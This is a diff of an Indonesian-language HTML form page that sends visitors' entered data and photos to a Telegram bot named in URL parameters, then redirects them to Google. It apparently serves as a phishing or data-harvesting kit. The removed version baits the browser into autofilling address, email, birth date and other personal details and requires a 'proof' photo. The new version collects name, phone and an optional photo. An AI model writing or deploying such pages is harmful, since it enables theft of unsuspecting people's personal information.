@@ -3,167 +3,143 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Sender</title>
+    <title>Simple Sender</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f4f6f8; padding: 20px; }
-        .container { max-width: 500px; margin: 0 auto; background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        h2 { text-align: center; margin-bottom: 20px; color: #333; }
+        body { font-family: sans-serif; background: #f4f6f8; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { width: 100%; max-width: 400px; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        h3 { text-align: center; margin-top: 0; color: #333; }
         
         .form-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 6px; font-weight: 600; font-size: 0.9em; color: #444; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; color: #555; font-size: 0.9rem; }
         
-        /* Input styling */
-        input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; background-color: #fff; }
-        input:focus { border-color: #0088cc; outline: none; box-shadow: 0 0 0 3px rgba(0,136,204,0.2); }
-        
-        /* Agar warna kuning autofill browser tidak merusak desain */
-        input:-webkit-autofill {
-            -webkit-box-shadow: 0 0 0 30px white inset !important;
-        }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; margin-bottom: 5px; transition: 0.3s; }
+        input:focus { border-color: #0088cc; outline: none; }
 
-        .btn-submit { background-color: #0088cc; color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; transition: background 0.3s; }
+        .btn-submit { background-color: #0088cc; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
         .btn-submit:hover { background-color: #006699; }
+        .btn-submit:disabled { background-color: #ccc; }
         
-        .hidden-info { color: red; text-align: center; font-size: 0.85em; display: none; margin-bottom: 10px; background: #ffe6e6; padding: 10px; border-radius: 8px;}
+        #status { text-align: center; margin-top: 10px; font-size: 0.85rem; color: #666; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>Data Diri Otomatis</h2>
-    <div id="error-msg" class="hidden-info">URL tidak lengkap (token/chatid missing)</div>
+    <h3>Form Cepat</h3>
+    
+    <div class="form-group">
+        <label>Nama</label>
+        <input type="text" id="nama" autocomplete="name" placeholder="Isi nama...">
+    </div>
 
-    <form id="telegramForm">
-        
-        <div class="form-group">
-            <label>Nama Lengkap</label>
-            <input type="text" name="name" id="name" autocomplete="name" placeholder="Nama Lengkap" required>
-        </div>
+    <div class="form-group">
+        <label>Nomor HP</label>
+        <input type="tel" id="hp" autocomplete="tel" placeholder="Isi nomor...">
+    </div>
 
-        <div class="form-group">
-            <label>Email</label>
-            <input type="email" name="email" id="email" autocomplete="email" placeholder="email@address.com">
-        </div>
+    <div class="form-group">
+        <label>Pilih Foto (Opsional)</label>
+        <input type="file" id="foto" accept="image/*">
+    </div>
 
-        <div class="form-group">
-            <label>No HP / WhatsApp</label>
-            <input type="tel" name="phone" id="phone" autocomplete="tel" placeholder="+62...">
-        </div>
-
-        <div class="form-group">
-            <label>Organisasi / Kantor</label>
-            <input type="text" name="organization" id="org" autocomplete="organization">
-        </div>
-
-        <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
-        <label style="color: #888; font-size: 0.8em; margin-bottom: 10px;">ALAMAT (Klik di sini untuk trigger autofill lengkap)</label>
-
-        <div class="form-group">
-            <label>Alamat Jalan</label>
-            <input type="text" name="address" id="address" autocomplete="street-address" placeholder="Jalan, No Rumah">
-        </div>
-
-        <div class="form-group">
-            <label>Kota / Kab</label>
-            <input type="text" name="city" id="city" autocomplete="address-level2">
-        </div>
-
-        <div class="form-group">
-            <label>Kode Pos</label>
-            <input type="text" name="zip" id="zip" autocomplete="postal-code">
-        </div>
-        
-        <div class="form-group">
-            <label>Tanggal Lahir</label>
-            <input type="text" name="birthday" id="dob" autocomplete="bday" placeholder="YYYY-MM-DD">
-        </div>
-
-        <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
-
-        <div class="form-group">
-            <label>📸 Foto Bukti (Wajib)</label>
-            <input type="file" id="foto" accept="image/*" required>
-        </div>
-
-        <button type="submit" class="btn-submit" id="btnSend">Kirim Telegram</button>
-    </form>
+    <button onclick="kirimData()" id="btnSend" class="btn-submit">Kirim Sekarang</button>
+    <div id="status"></div>
 </div>
 
 <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const botToken = urlParams.get('token'); 
-    const chatId = urlParams.get('chatid');
-    const redirectUrl = urlParams.get('redirect') || 'https://google.com';
+    // Ambil parameter dari URL
+    const params = new URLSearchParams(window.location.search);
+    const token = params.get('token');
+    const chatId = params.get('chatid');
+    const redirect = params.get('redirect') || 'https://google.com';
 
-    if (!botToken || !chatId) {
-        document.getElementById('error-msg').style.display = 'block';
-        document.getElementById('btnSend').disabled = true;
-        document.getElementById('btnSend').innerText = "Link Error";
-        document.getElementById('btnSend').style.backgroundColor = "#ccc";
-    }
-
-    document.getElementById('telegramForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        
+    async function kirimData() {
         const btn = document.getElementById('btnSend');
-        const originalText = btn.innerText;
-        btn.innerText = "Sedang Mengirim...";
-        btn.disabled = true;
-
-        const inputs = document.querySelectorAll('#telegramForm input:not([type="file"])');
-        let captionText = "📝 *DATA USER MASUK*\n------------------\n";
-
-        // Mapping label manual agar rapi di Telegram
-        const labels = {
-            'name': 'Nama', 'email': 'Email', 'phone': 'No HP', 
-            'organization': 'Organisasi', 'address': 'Alamat', 
-            'city': 'Kota', 'zip': 'Kode Pos', 'birthday': 'Tgl Lahir'
-        };
-
-        inputs.forEach(input => {
-            if(input.value) {
-                let label = labels[input.name] || input.name;
-                captionText += `*${label}:* ${input.value}\n`;
-            }
-        });
-
-        const fileInput = document.getElementById('foto');
+        const status = document.getElementById('status');
         
-        if(fileInput.files.length === 0) {
-            alert("Harap pilih foto terlebih dahulu!");
-            btn.innerText = originalText;
-            btn.disabled = false;
+        // Cek Token
+        if (!token || !chatId) {
+            status.innerText = "Error: URL tidak lengkap (kurang token/chatid)";
+            status.style.color = "red";
             return;
         }
 
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("photo", fileInput.files[0]);
-        formData.append("caption", captionText);
-        formData.append("parse_mode", "Markdown");
+        // Ambil Data Input
+        const nama = document.getElementById('nama').value;
+        const hp = document.getElementById('hp').value;
+        const fotoInput = document.getElementById('foto');
+        const foto = fotoInput.files[0];
+
+        // Validasi: Jika kosong semua, jangan kirim
+        if (!nama && !hp && !foto) {
+            status.innerText = "Isi minimal salah satu data (Nama, HP, atau Foto)";
+            status.style.color = "red";
+            return;
+        }
+
+        btn.disabled = true;
+        btn.innerText = "Mengirim...";
+        status.innerText = "";
+
+        // Susun Pesan Teks
+        let pesan = "📩 *DATA MASUK*\n";
+        if (nama) pesan += `👤 Nama: ${nama}\n`;
+        if (hp) pesan += `📱 HP: ${hp}\n`;
 
         try {
-            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            let url = "";
+            let bodyData;
+            let headers = {};
+
+            if (foto) {
+                // Skenario 1: Ada Foto (Gunakan endpoint sendPhoto)
+                url = `https://api.telegram.org/bot${token}/sendPhoto`;
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', foto);
+                if (nama || hp) {
+                    formData.append('caption', pesan);
+                    formData.append('parse_mode', 'Markdown');
+                }
+                bodyData = formData;
+            } else {
+                // Skenario 2: Hanya Teks (Gunakan endpoint sendMessage)
+                url = `https://api.telegram.org/bot${token}/sendMessage`;
+                bodyData = JSON.stringify({
+                    chat_id: chatId,
+                    text: pesan,
+                    parse_mode: 'Markdown'
+                });
+                headers = { 'Content-Type': 'application/json' };
+            }
+
+            // Eksekusi Kirim
+            const response = await fetch(url, {
                 method: 'POST',
-                body: formData
+                headers: headers,
+                body: bodyData
             });
 
             const result = await response.json();
 
             if (result.ok) {
-                window.location.href = redirectUrl;
+                btn.innerText = "Sukses!";
+                status.innerText = "Dialihkan...";
+                setTimeout(() => {
+                    window.location.href = redirect;
+                }, 1000); // Jeda 1 detik sebelum redirect
             } else {
-                alert("Gagal: " + result.description);
-                btn.innerText = originalText;
-                btn.disabled = false;
+                throw new Error(result.description);
             }
+
         } catch (error) {
             console.error(error);
-            alert("Error koneksi internet.");
-            btn.innerText = originalText;
+            status.innerText = "Gagal: " + error.message;
+            status.style.color = "red";
             btn.disabled = false;
+            btn.innerText = "Coba Lagi";
         }
-    });
+    }
 </script>
 
 </body>
